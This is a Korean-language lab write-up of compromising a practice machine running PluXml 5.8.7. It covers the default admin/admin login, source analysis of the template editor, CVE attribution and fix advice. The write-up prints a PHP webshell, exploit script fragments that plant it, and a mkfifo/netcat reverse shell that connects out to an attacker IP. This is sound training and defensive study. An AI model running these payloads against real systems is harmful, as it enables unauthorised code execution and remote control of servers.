---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/code-injection
  - tech/payload/revshell
  - tech/cred/reuse
type: machine
platform: pg
os: linux
ip: 192.168.132.28
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2024-48138]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---
> [!info] 요약
> 타겟 `192.168.132.28` · Debian 11 (bullseye), 호스트명 `plum` · Intermediate · 플래그 2개
> 진입점: 80/tcp PluXml 5.8.7 → 기본 자격증명 `admin/admin` → 관리자 테마 템플릿 편집기로 `static.php` 에 웹셸 기록(CVE-2024-48138) → `www-data` 리버스셸
> 권한상승: `/var/spool/mail/www-data` 메일함에 root 평문 비밀번호 → `su -` → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.132.28

### Initial Access – PluXml 관리자 기본 자격증명에서 테마 템플릿 편집기의 임의 PHP 쓰기로 이어진 원격 코드 실행

**Vulnerability Explanation:** 두 결함이 체인됨.
- 설치 기본 관리자 자격증명 `admin`/`admin` 이 변경되지 않은 채 `/core/admin/` 에 노출 — 인증 우회 없이 관리자 세션 획득
- 관리자 템플릿 편집기(`core/admin/parametres_edittpl.php`)가 POST 본문을 필터·확장자 검증 없이 테마 디렉터리의 `.php` 파일에 그대로 기록. 테마 템플릿은 데이터가 아니라 `include` 되는 PHP 소스 파일이라 **저장된 내용이 곧 코드** — CWE-94 코드 인젝션
- 해당 결함은 **CVE-2024-48138**(v5.8.16 이하). 익스플로잇 README 가 인용하는 CVE-2022-25018 은 정적 페이지(`statique.php`) 경로로 별개임

**Vulnerability Fix:**
- 설치 직후 관리자 비밀번호 변경 강제 + 로그인 실패 제한(fail2ban). 이 하나만 고쳤어도 체인 전체가 시작조차 못 함
- 관리 경로(`/core/admin/`)를 IP 제한·HTTP Basic·VPN 뒤로 두고 관리자 계정에 MFA
- `themes/`·`plugins/`·웹루트 자체는 웹서버 계정 읽기 전용으로. PluXml 이 쓰기를 요구하는 것은 `data/` 뿐임
- ⚠️ **버전 업그레이드만으로는 안 됨** — v5.8.7~v5.8.23 저장 로직이 동일하고, master 가 넣은 `$tpl` 화이트리스트에도 `.php` 가 남아 「관리자 = 코드 실행」 성질은 유지됨

**Severity:** Critical — 기본 자격증명이 그대로라 사실상 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `http://192.168.132.28/core/admin/` 에 `admin`/`admin` 로그인
2. Information 화면에서 버전 5.8.7 · `themes/` 쓰기 가능 · 정적 페이지 1개 확인
3. 템플릿 편집기에서 `static.php` 를 Load — 응답에서 CSRF 토큰을 새로 파싱
4. 새 토큰으로 `static.php` 원본 + `<?php system($_GET['cmd']); ?>` 를 Save
5. `/index.php?static1/static-1&cmd=id` 로 실행 여부 확인
6. 같은 경로에 `mkfifo` 리버스셸 명령 전달 → `www-data` 셸

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.132.28 | TCP: 22, 80 |

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ nnmap 192.168.132.28
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 12:41 +0900
Nmap scan report for 192.168.132.28
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: PluXml - Blog or CMS, XML powered !
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   65.25 ms 192.168.45.1
2   65.21 ms 192.168.45.254
3   65.73 ms 192.168.251.1
4   65.87 ms 192.168.132.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```
— 출처: 터미널 전사. 같은 스캔의 파일 사본은 `~/PG/plum/nmap.log`(`nnmap` 별칭의 `-oN`)이며 첫·끝 줄만 `# Nmap 7.98 scan initiated …` / `# Nmap done at …` 형식으로 다름. 본문 스캔 결과는 양쪽이 바이트 단위로 동일함.

`nnmap` 은 개인 별칭이고 시험장 머신에는 없음(상세: [[pyLoader]]). 아래 플래그를 손으로 칠 수 있어야 함.

```bash
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 여기서는 22/80이라 기본 스캔으로도 잡힌다. 그래도 생략하지 않는다 — 안 열려 있음을 확인하는 것 자체가 정보다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: PluXml` 이 안 나온다. 이 한 줄이 제품명을 확정해주고, 제품명이 곧 검색 키워드다 |
| `-Pn` | ping 생략 | PG 랩은 ICMP를 막는 경우가 있다 |
| `-A` | OS 추측 + traceroute | 여기서도 틀렸다(`MikroTik RouterOS`) |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔 26초 |
| `-oN nmap.log` | 저장 | 재실행 없이 재확인 |

`-A` 의 OS 추측은 `MikroTik RouterOS 7.2 - 7.5` 를 후보로 냄. 실제는 Debian 11 (bullseye)이고 근거는 배너의 패키지 리비전 쪽에 있음.

```text
OpenSSH 8.4p1 Debian 5+deb11u1     ← "deb11" = Debian 11 bullseye
Apache httpd 2.4.56 ((Debian))
```
— 출처: `~/PG/plum/nmap.log`

`deb11u1` 같은 접미사는 배포판과 메이저 릴리스를 거의 확정함. [[pyLoader]] 의 `3ubuntu0.1` → Ubuntu 22.04 판정과 같은 규칙임.

**버전 판정 독립 근거 2개** — ① nmap 배너 `Apache httpd 2.4.56 ((Debian))` ② 관리 콘솔 Information 화면의 `Apache/2.4.56 (Debian)`. 둘이 교차 일치.
⚠️ 반면 **PluXml `5.8.7` 은 근거가 관리 콘솔이 렌더한 값 하나뿐**이라 그 원칙에 미달함([[Hub]]·[[Levram]]). 보강하려면 `/CHANGELOG.md`·정적 자원의 `?v=` 쿼리를 확인. 이 박스에서는 버전 정확도가 결정적이지 않아 그대로 진행함 — 템플릿 편집기 RCE 는 릴리스 태그 5.8.7~5.8.23 저장 로직이 동일해 버전과 무관하게 동작함(`Initial Access` 재현 절의 CVE 판정 참조).

포트는 22/80 둘뿐이고 나머지가 전부 `closed`. `closed` = RST 응답 = 인바운드 경로에 패킷을 버리는 방화벽이 없음.

⚠️ 여기서 「그러니 아웃바운드도 열려 있다」로 넘어가면 안 됨 — **인바운드 RST 는 들어오는 방향의 정보이고 egress 정책에 대해서는 아무것도 말해주지 않음.** 인바운드 무필터 + 아웃바운드 화이트리스트는 흔한 구성임. 결과적으로 4444 리버스셸이 붙은 것은 사실이나, 결과가 맞은 것과 추론이 성립하는 것은 별개임.

또 하나 — nmap 이 25번(SMTP)을 보지 못함. `Privilege Escalation` 절의 `netstat` 로 `127.0.0.1:25` 에 Exim 이 살아 있음이 확인됨. **루프백 전용 서비스는 외부 스캔에 원리적으로 안 잡힘.**

**웹 — PluXml**

`http://192.168.132.28/` 이 PluXml 기본 블로그. 관리 콘솔은 `/core/admin/`.

기본 자격증명 **`admin` / `admin`** 이 그대로 통함.

![[Pasted image 20260629125057.png]]

CMS 를 보면 기본 자격증명이 1순위임. `admin/admin` · `admin/password` · `admin/<제품명>` · `root/root` 를 3~5개만 손으로 시도 — 통하면 몇 시간을 아끼고 안 통해도 1분임.

**Information 페이지 — 공격 전제조건을 앱이 대신 확인해준다**

관리 콘솔의 Information 화면이 버전과 환경을 통째로 렌더함.

![[Pasted image 20260629125819.png]]

| 항목 | 값 | 이 값이 왜 중요한가 |
|---|---|---|
| PluXml version | **5.8.7** (charset UTF-8) | CVE 판정의 출발점 |
| PHP version | 7.4.33 | 웹셸이 쓸 수 있는 함수의 범위 |
| 서버 | Apache/2.4.56 (Debian) | nmap 배너와 교차 일치 |
| ✓ `../../themes/ has write access` | ★ | 템플릿 편집기가 파일을 실제로 쓸 수 있다는 확인. 이 체크가 ✗였다면 익스플로잇은 실패한다 |
| ✓ `../../`, `data/configuration/`, `data/articles/`, `data/statiques/`, `data/medias/`, `plugins/` 쓰기 가능 | | 웹 루트 전체가 www-data 쓰기 가능 — 대안 경로가 많다 |
| ✗ Apache URL Rewriting module mod_rewrite unavailable | | URL이 예쁘게 안 나온다. 익스플로잇이 `/index.php?static1/static-1` 형태로 접근하는 이유 |
| ✗ GD library not installed | | 이미지 처리 없음 — 이미지 업로드 우회 경로는 없다 |
| ✓ XML library installed | | PluXml은 DB 대신 XML을 쓴다 |
| ✓ Mail sending function available | ★ | 로컬 MTA 생존. `Privilege Escalation` 의 메일함 경로를 여기서 이미 예고함 |
| N° of static pages: 1 | | 익스플로잇이 노리는 `static-1`이 바로 이 페이지다 |
| N° of users in session: admin | | 사용자는 admin 하나 |

이 화면 하나가 버전·PHP 버전·쓰기 가능 디렉터리·활성 모듈·메일 기능 가용성을 전부 줌. **디렉터리 브루트포싱 30분보다 이 페이지 30초가 나음.** 찾을 이름은 `Information`·`System Status`·`Site Health`(WordPress)·`phpinfo.php`·`info.php`·`server-status`·`/actuator/env` 쯤. [[Squid]] 에서 `phpsysinfo` 와 `testmysql.php` 가 같은 역할을 했음.

두 값이 뒤 절차를 그대로 결정함 — `themes/ has write access` 초록 체크는 템플릿 편집기가 파일을 실제로 쓸 수 있다는 확인이고, `Mail sending function available` 은 로컬 MTA 생존을 뜻해 `Privilege Escalation` 의 메일함 경로를 미리 예고함.

### Initial Access – 기본 자격증명 → 템플릿 편집기 RCE

**배경 — PluXml 은 DB 가 없는 XML 기반 CMS다.** MySQL 같은 DB 없이 XML 파일로 글·설정을 저장하는 경량 CMS라 SQL 인젝션 공격면이 아예 없고 sqlmap 을 꺼낼 일이 없음. 대신 **파일 시스템이 곧 데이터베이스**라 웹서버 계정이 웹 루트에 쓰기 권한을 가져야 앱이 동작함. 「임의 파일 쓰기」가 이 앱에서는 **정상 기능**이고 그것이 그대로 공격면이 됨.

저장 방식이 공격면을 결정함. RDBMS 면 SQLi → `INTO OUTFILE`/`DUMPFILE`([[Squid]]·[[Hawat]]), 역직렬화 저장이면 insecure deserialization, 플랫 파일/XML 이면 파일 쓰기 권한 그 자체와 XXE·경로 트래버설임. **DB 가 안 보인다는 것은 공격면이 없다는 뜻이 아니라 다른 곳에 있다는 뜻임.**

**취약 코드 — `core/admin/parametres_edittpl.php`**

PluXml v5.8.7 원문:

```php
plxToken::validateFormToken($_POST);
$plxAdmin->checkProfil(PROFIL_ADMIN);

$tpl = isset($_POST['tpl'])?$_POST['tpl']:'home.php';
if(!empty($_POST['load'])) $tpl = $_POST['template'];

$style = $plxAdmin->aConf['style'];
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);
if(!preg_match('#^'.str_replace('\\', '/', realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/').'#'), str_replace('\\', '/', $filename))) {
	$tpl='home.php';
}
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);

# Traitement du formulaire: sauvegarde du template
if(isset($_POST['submit']) AND trim($_POST['content']) != '') {
	if(plxUtils::write($_POST['content'], $filename))
```

데이터 흐름을 한 줄씩 따라가면 이렇게 됨.

| 줄 | 무슨 일이 일어나는가 |
|---|---|
| `validateFormToken($_POST)` | CSRF 토큰 검증 — 1회용임(같은 절 뒤에서 다룸) |
| `checkProfil(PROFIL_ADMIN)` | 관리자만 통과(`core/lib/config.php` 의 `PROFIL_ADMIN = 0`). `admin/admin` 이 통했으므로 무의미해졌다 |
| `$tpl = $_POST['template']` | 편집할 파일명을 클라이언트가 지정한다 |
| `$filename = realpath(themes/<style>/<tpl>)` | 절대 경로 확정 |
| `preg_match('#^<themes 절대경로>#', $filename)` | 테마 디렉터리 밖으로 나가는 것만 막는다 (경로 트래버설 방어) |
| `plxUtils::write($_POST['content'], $filename)` | ★ 본문을 가공 없이 그대로 파일에 쓴다 |

`plxUtils::write()` 의 실체는 이것임. `core/lib/class.plx.utils.php` v5.8.7 원문 전문이고 필터가 없음.

```php
	public static function write($xml, $filename) {

		if(file_exists($filename)) {
			$f = fopen($filename.'.tmp', 'w'); # On ouvre le fichier temporaire
			fwrite($f, trim($xml)); # On écrit
			fclose($f); # On ferme
			unlink($filename);
			rename($filename.'.tmp', $filename); # On renomme le fichier temporaire avec le nom de l'ancien
		} else {
			$f = fopen($filename, 'w'); # On ouvre le fichier
			fwrite($f, trim($xml)); # On écrit
			fclose($f); # On ferme
		}
		# On place les bons droits
		chmod($filename,0644);
		# On vérifie le résultat
		if(file_exists($filename) AND !file_exists($filename.'.tmp'))
			return true;
		else
			return false;
	}
```

`else` 가지 — `fopen($filename, 'w')` — 는 `write()` 자체가 신규 파일을 만들 수 있다는 뜻임. 신규 생성을 막는 것은 `write()` 가 아니라 상류의 `realpath()` 임. **인용을 잘라내면 인과가 바뀜** — 소스는 판단에 필요한 분기까지 통째로 옮길 것.

저장된 내용이 PHP 로 실행되는 경로:

```text
POST content ──→ plxUtils::write() ──→ themes/<style>/static.php
                     (필터 0, 확장자 검증 0)
                                              │
   공개 사이트 접속 → index.php → plxMotor/plxShow 가 테마 템플릿을 include
                                              ▼
                        저장된 <?php system($_GET['cmd']); ?> 가 PHP 파서에 의해 실행
```

**`eval()` 이 필요 없음.** 테마 템플릿은 데이터가 아니라 `include` 되는 PHP 소스 파일이고 파일 내용이 곧 코드임.

> [!danger] 확장자 검증이 없는 게 아니라, 있는데 `.php` 를 허용함
> 유일한 확장자 화이트리스트는 편집기 드롭다운 목록을 만드는 용도이고 거기에도 `.php` 가 들어 있음:
> ```php
> $aTemplates=listFolderFiles($root, array('.php','.css','.htm','.html','.txt','.js','.xml'), $root);
> ```
> 쓰기 경로(`plxUtils::write`)에는 확장자 검사가 아예 없음. 목록은 UI 편의일 뿐 보안 통제가 아님.
> 「드롭다운에 있는 것만 고를 수 있다」는 클라이언트 측 제약이라 서버가 다시 검사하지 않으면 없는 것과 같음. **선택지가 제한된 폼을 보면 값을 직접 바꿔 POST 해 볼 것.**

**왜 새 파일을 만들지 않고 기존 파일을 덮어쓰는가**

익스플로잇 `pluxml.py` 는 `static.php` 라는 기존 템플릿을 덮어씀. `shell.php` 같은 새 파일을 만들지 않는데 게으름이 아니라 강제된 선택임. 답은 `realpath()` 에 있음.

```php
$style = $plxAdmin->aConf['style'];
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);
if(!preg_match('#^'.str_replace('\\', '/', realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/').'#'), str_replace('\\', '/', $filename))) {
	$tpl='home.php';
}
$filename = realpath(PLX_ROOT.$plxAdmin->aConf['racine_themes'].$style.'/'.$tpl);
```

★ 두 줄이 결정적임 — 블록 안의 `$tpl='home.php'` 폴백과 블록 다음 줄의 `$filename` **재계산**.

**`realpath()` 는 존재하지 않는 경로에 `false` 를 반환함.** 사후에 Kali 에서 재현해 확인함(이 박스에서 관측된 것이 아님).

```bash
ssh kali@10.44.44.128 "php -r 'var_dump(realpath(\"/tmp/definitely_does_not_exist_12345.php\")); var_dump(realpath(\"/etc/hostname\"));'"
```

```text
bool(false)
string(13) "/etc/hostname"
```

그래서 `$tpl = 'shell.php'` 를 보내면 실제로는 이렇게 흘러감.

| # | 평가 | 결과 |
|---|---|---|
| ① | `$filename = realpath(themes/<style>/shell.php)` | `false` (그런 파일이 없다) |
| ② | `str_replace('\\','/', false)` | `false` 가 문자열 문맥에서 `""` 로 캐스팅 |
| ③ | `preg_match('#^<themes 절대경로>#', "")` | `0` (빈 문자열에는 접두사가 없다) |
| ④ | `if(!0)` | `true` → 블록 진입 |
| ⑤ | `$tpl = 'home.php'` | ★ 파일명이 조용히 바뀐다 |
| ⑥ | `$filename = realpath(themes/<style>/home.php)` | ★ 유효한 절대 경로로 재계산된다 |
| ⑦ | `plxUtils::write($_POST['content'], $filename)` | ★ 쓰기 성공 — `home.php` 가 덮인다 |

> [!danger] 「쓰기가 성립하지 않는다」가 아니라 첫 화면이 털림
> `$filename` 은 `false` 인 채로 `write()` 에 도달하지 못함 — ④⑤에서 `home.php` 로 폴백되고 ⑥에서 재계산되기 때문임. `false` 가 `write()` 까지 흘러가는 경로가 애초에 없음.
> 실전 차이가 큼. 존재하지 않는 파일명을 넣으면 아무 일도 안 일어나는 게 아니라 사이트 첫 화면(`home.php`)에 페이로드가 심김. 공격자에게는 오히려 트리거가 더 쉬운 결과임 — `/` 만 열면 실행됨.
> 시험장 관점에서 「새 파일명을 넣었더니 반응이 없다」고 읽으면 이미 심긴 웹셸을 못 찾음. **반응이 없어 보이면 `home.php` 를 확인할 것.**

즉 이 결함은 임의 파일 생성이 아니라 **기존 테마 파일 덮어쓰기**이고, 파일명을 잘못 넣으면 대상이 `home.php` 로 강제됨.

새 파일을 못 만드니 멀쩡한 템플릿을 망가뜨려야 함. 익스플로잇이 원본 `static.php` 내용을 통째로 코드에 박아두고 웹셸만 끼워 넣어 다시 저장하는 이유가 이것임.

```python
data = {'token': token, 'template': 'static.php', 'submit': 'Save the file',
        'tpl': 'static.php', 'content': content + simple_web_shell + footer}
```

원본을 복원하려는 배려이자 사이트가 깨지면 관리자가 즉시 알아챈다는 실전 고려임. 실무 침투테스트에서는 덮어쓰기 전에 원본을 백업하고 작업 후 되돌림.

어떤 파일을 고를 것인가도 판단이 필요함. `home.php` 는 첫 화면이라 접근이 쉽지만 가장 눈에 띄고 잘못된 파일명을 보내면 강제로 여기가 대상이 됨. `static.php` 는 정적 페이지 1개(`static-1`)에서만 렌더돼 눈에 덜 띄고 접근 경로가 명확함 — 익스플로잇의 선택이 이것임. `footer.php`·`sidebar.php` 는 모든 페이지에 include 돼 어디서든 트리거되지만 그만큼 티가 남.

**CSRF 토큰이 1회용이다 — 익스플로잇이 매번 다시 긁는 이유**

토큰 생성(`core/lib/class.plx.token.php`, v5.8.7):

```php
	public static function getTokenPostMethod($length=32, $html=true) {

		$token = substr(
			str_shuffle(self::TEMPLATE),
			mt_rand(0, self::TEMPLATE_LENGTH - $length),
			$length
		);
		$_SESSION['formtoken'][$token] = time();

		return ($html) ? '<input name="token" value="'.$token.'" type="hidden" />' : $token;
	}
```

검증 쪽이 문제임:

```php
	public static function validateFormToken($request='') {
		if($_SERVER['REQUEST_METHOD']=='POST' AND isset($_SESSION['formtoken'])) {
			$limit = time() - self::LIFETIME;
			if(empty($_POST)) {
				return;
			}
			if(empty($_POST['token']) OR plxUtils::getValue($_SESSION['formtoken'][$_POST['token']]) < $limit) {
				unset($_SESSION['formtoken']);
				die('Security error : invalid or expired token');
			}
			unset($_SESSION['formtoken'][$_POST['token']]);
```

**토큰은 1회용임.** 마지막 줄이 소비 즉시 그 키를 폐기하므로 같은 토큰을 두 번 보내면 `getValue()` 가 빈 값을 돌려 `< $limit` 이 성립하고, `unset($_SESSION['formtoken'])` 로 **세션의 토큰 전체가 날아간 뒤** `die()` 함. 실패 한 번이 그 세션의 발급 토큰 전부를 무효화함.

⚠️ 다만 **「로그인부터 다시 해야 한다」는 틀림** — 소스 확인 결과 세션 자체는 유지되고, 편집 화면을 다시 GET 하면 `getTokenPostMethod()` 가 새 토큰을 발급함. 오히려 `unset` 직후에는 `isset($_SESSION['formtoken'])` 이 거짓이라 **다음 POST 는 검증 블록을 통째로 건너뜀.** 자동화가 토큰에서 막히면 편집 페이지를 한 번 다시 긁는 것으로 복구됨.

⚠️ 더 나쁜 것은 **`die('Security error : invalid or expired token')` 가 200 응답으로 온다는 것** — 상태 코드만 보면 성공처럼 보임. 자동화가 이상하면 응답 본문을 파일로 통째로 저장해 눈으로 볼 것.

그래서 익스플로잇의 저장 절차가 2단계 POST 임.

```python
data = {'token': token, 'template': 'static.php', 'load': 'Load', 'tpl': 'static.php', 'content': content + footer}
r = s.post(url + edit_path, data=data, ...)
soup = BeautifulSoup(r.text, 'html.parser')
token = soup.find('input', {'name':'token'})['value']

data = {'token': token, 'template': 'static.php', 'submit': 'Save the file', 'tpl': 'static.php',
        'content': content + simple_web_shell + footer}
s.post(url + edit_path, data=data, ...)
```

① `'load': 'Load'` 로 편집기에 `static.php` 를 불러오고 응답에서 새 토큰을 추출. ② `'submit': 'Save the file'` 로 그 새 토큰과 함께 웹셸을 포함해 저장. ①의 목적은 파일을 불러오는 것이 아니라 **새 토큰을 받는 것**임.

**CVE 판정 — 실제 악용 경로는 CVE-2024-48138이다**

익스플로잇 저장소 `erlaplante/pluxml-rce` 의 README 참조:

```text
### PluXml 5.8.7 RCE

Used for practice on CTF machine, requires valid credentials.

##### References
https://nvd.nist.gov/vuln/detail/CVE-2022-25018 \
https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf
```
— 출처: `~/PG/plum/pluxml-rce/README.md` 전문(228바이트)

1차 사료와 어긋남. NVD/MITRE 의 CVE-2022-25018 원문은 *"Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into **static pages**."* 이고, 발견자(Moritz Huppert)의 원 보고서는 템플릿 편집기를 명시적으로 배제함 — *"While the administrator role has the permission to edit PHP templates and, thus, **can always execute arbitrary code**, the manager role has no such privileges. Indeed, a manager can only edit so-called static — purely HTML-written — pages."*

즉 CVE-2022-25018 은 `core/admin/statique.php` / `editStatique()` 경로이고 manager 권한으로도 RCE 가 된다는 것이 요지임. 이 박스에서 쓴 것은 관리자 전용 템플릿 편집기(`parametres_edittpl.php`)로 **완전히 다른 파일**임.

| CVE | 실제 대상 | 필요 권한 | 영향 버전 | CVSS (점수 출처) | CWE |
|---|---|---|---|---|---|
| CVE-2022-25018 | 정적 페이지 (`statique.php` / `editStatique`) | manager (발견자 PDF 근거) | 5.8.7 | 8.8 HIGH `PR:L` — NVD Primary | CWE-94 |
| **CVE-2024-48138** | `parametres_edittpl.php` 템플릿 편집기 ← **이 박스에서 실제로 쓴 것** | admin (소스 근거: `checkProfil(PROFIL_ADMIN)`) | "v5.8.16 and lower" | 9.8 CRITICAL `PR:N` — CISA-ADP Secondary (NVD Primary 점수 없음) | CWE-94 |
| CVE-2024-22636 | 정적 페이지 RCE 재발 | **[가정]** manager (NVD 본문에 권한 언급 없음, `PR:L` 에서 추론) | 5.8.9 | 8.8 HIGH `PR:L` — NVD Primary + ADP Secondary | `NVD-CWE-noinfo` |

⚠️ **CVE-2024-48138 의 「9.8 CRITICAL」과 「필요 권한 admin」은 양립하지 않음.** 9.8 을 만드는 벡터는 `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` 이고 `PR:N` 은 권한 불필요라는 뜻인데, 위에서 인용한 소스는 `$plxAdmin->checkProfil(PROFIL_ADMIN);` 으로 관리자 세션을 요구함.

NVD API 로 확인하니 이 CVE 에는 NVD Primary 점수가 아예 없음. 유일한 점수가 CISA-ADP(`134c704f-9b21-4f2e-91b3-4a467353bcc0`)의 Secondary 이고 그 벡터의 `PR:N` 이 부정확함.

```text
cvssMetricV31  134c704f-…-4a467353bcc0  Secondary  9.8  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

```bash
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-48138" | jq '.vulnerabilities[0].cve.metrics'
```

실제 소스 기준으로는 `PR:H`(관리자)가 맞고 그러면 점수는 7점대로 내려감. **CVSS 점수를 인용할 때는 출처와 벡터를 함께 볼 것.** 자동 부여된 ADP 점수는 권한 요구를 자주 놓침 — 리포트에 「9.8 CRITICAL」만 옮기면 심각도를 부풀린 것이 되고 검토자가 벡터를 열어보는 순간 신뢰를 잃음.

**패치 상황.** PluXml git 실측으로 `core/admin/parametres_edittpl.php` 의 저장 로직은 v5.8.7(2021)·v5.8.16·v5.8.23(2026)이 사실상 동일함. 세 태그 사이 diff 는 경로 표기 차이 3곳뿐이고 보안 로직은 한 줄도 안 바뀜.

```text
8c8
< include __DIR__ .'/prepend.php';
---
> include 'prepend.php';
73c73
< include __DIR__ .'/top.php';
---
> include 'top.php';
104c104
< include __DIR__ .'/foot.php';
---
> include 'foot.php';
```
— v5.8.7 과 v5.8.16 은 **바이트 단위로 동일**(양쪽 3606B). v5.8.23(3576B)과의 차이는 위 3줄이 전부임. 출처: 각 태그의 `raw.githubusercontent.com` 사본을 내려받아 `diff` 로 대조함.

벤더는 「관리자는 PHP 템플릿을 편집할 수 있다」를 정상 기능으로 취급함. 발견자 본인도 그렇게 적었음(*"can always execute arbitrary code"*).

master(`HEAD`)는 이 파일을 재작성했고 `$tpl` 화이트리스트 검사와 `exit` 를 넣음.

```php
const TEMPLATE_EXTS_PATTERN = '#(?:php|css|html?|txt|js|xml)#i';
...
# Contrôle du template sélectionné par <select>
if(!in_array($tpl, $aTemplates)) {
	plxMsg::Error(L_CONFIG_EDITTPL_ERROR_NOTHEME);
	header('Location: parametres_themes.php');
	exit;
}
```

master 에서는 `home.php` 강제 폴백이 사라지고 목록에 없는 `$tpl` 은 저장 단계에 도달조차 못 함. 그래도 화이트리스트 `$aTemplates` 에 `.php` 가 여전히 있고 테마에 실재하는 `.php` 템플릿은 그대로 덮어쓸 수 있어 **「관리자 = 코드 실행」 성질은 master 에서도 살아 있음.** 바뀐 것은 임의 파일명이 막혔다는 것뿐임.

대조적으로 정적 페이지 쪽(CVE-2022-25018)은 패치됐다가 되돌려짐. `15170a27`(2022-04-27 `sanitizePhpTags()` 추가) → `374a401b`(2022-08-01 Revert) → 5.8.9 에서 재취약(= CVE-2024-22636).

**웹셸과 리버스셸 페이로드**

심은 웹셸은 최소 형태:

```php
<?php system($_GET['cmd']); ?>
```

트리거 경로:

```text
http://192.168.132.28/index.php?static1/static-1&cmd=<URL 인코딩된 명령>
```

경로가 `/index.php?static1/static-1` 인 것은 Information 페이지에서 확인한 `mod_rewrite unavailable` 때문임. PluXml 은 mod_rewrite 가 있으면 `/static1/static-1` 같은 URL 을 쓰지만 없으면 `index.php?` 뒤에 쿼리로 붙는 원시 형태로 동작함. `static-1` 은 같은 화면이 알려준 `N° of static pages : 1` 그 페이지임.

리버스셸 명령:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc 192.168.45.156 4444>/tmp/f
```
— `pluxml.py` 가 `rhost`·`rport` 를 채워 만든 문자열. 스크립트 원문은 `nc {rhost} {rport}>/tmp/f` 로 `>` 앞에 공백이 없음.

| 조각 | 역할 | 왜 이 형태인가 |
|---|---|---|
| `rm /tmp/f` | 이전 FIFO 제거 | 재시도 시 필수. 이미 있으면 `mkfifo` 가 `File exists` 로 실패한다 |
| `mkfifo /tmp/f` | 명명 파이프 생성 | 양방향 통신을 단방향 파이프 두 개로 만든다 |
| `cat /tmp/f \| bash -i 2>&1 \| nc ... >/tmp/f` | 파이프 순환 구성 | nc 출력 → FIFO → bash 입력 / bash 출력 → nc |
| `/usr/bin/bash` | 절대 경로 | 웹셸의 `system()` 은 `/bin/sh`(dash)로 돈다. dash에는 `/dev/tcp` 가 없으므로 bash를 명시 호출해야 한다 |
| `2>&1` | stderr 합류 | 없으면 에러 메시지를 못 본다 |

`/dev/tcp` 대신 `mkfifo` 를 쓴 이유는 둘임. `system()` 이 `/bin/sh` 로 실행되는데 Debian 의 `/bin/sh` 는 dash 이고 dash 에는 `/dev/tcp` 가상 파일이 없음. 그리고 Debian 기본 `netcat-openbsd` 에는 `-e` 옵션이 컴파일돼 있지 않음(백도어 방지). `mkfifo` 방식은 `-e` 없는 nc 에서도 동작해 리눅스에서 가장 범용적임.

⚠️ 익스플로잇 저자의 경고 *"change reverse shell type and/or bash path as appropriate"* 는 **README 가 아니라 `pluxml.py` 76행의 코드 주석**임. 산출물 실측:

```python
    # change reverse shell type and/or bash path as appropriate
    rev_shell = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc {rhost} {rport}>/tmp/f'
```

`README.md` 는 228바이트·7줄(내용 5줄)짜리 문서이고 리버스셸을 한 번도 언급하지 않음. **출처를 한 칸 옮겨 적는 것만으로 「저자가 문서에 명시했다」와 「코드를 읽어야만 보인다」라는 다른 사실이 되고 실전 함의가 정반대임** — 경고가 주석에만 있으면 스크립트를 실행만 하는 사람은 영영 못 봄.

기록에 `vi pluxml.py` 가 있어 「리버스셸 줄을 손봤을 것」이라고 추정하기 쉬우나 산출물이 반증함.

```bash
ssh kali@10.44.44.128 "cd ~/PG/plum/pluxml-rce && git status --porcelain; git diff --stat"
```

둘 다 **출력이 없음** = 추적 파일이 한 바이트도 수정되지 않았음.

